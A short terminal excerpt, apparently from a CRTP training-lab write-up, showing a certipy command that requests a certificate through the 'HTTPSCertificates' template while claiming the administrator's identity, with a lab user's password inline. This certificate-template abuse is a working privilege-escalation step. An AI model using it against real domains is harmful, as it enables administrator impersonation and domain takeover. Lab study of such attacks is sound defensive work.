...
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy req -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -target 'mcorp-dc.moneycorp.local' -ca 'moneycorp-mcorp-dc-ca' -template 'HTTPSCertificates' -upn 'administrator@moneycorp.local'
Certipy v4.3.0 - by Oliver Lyak (ly4k)
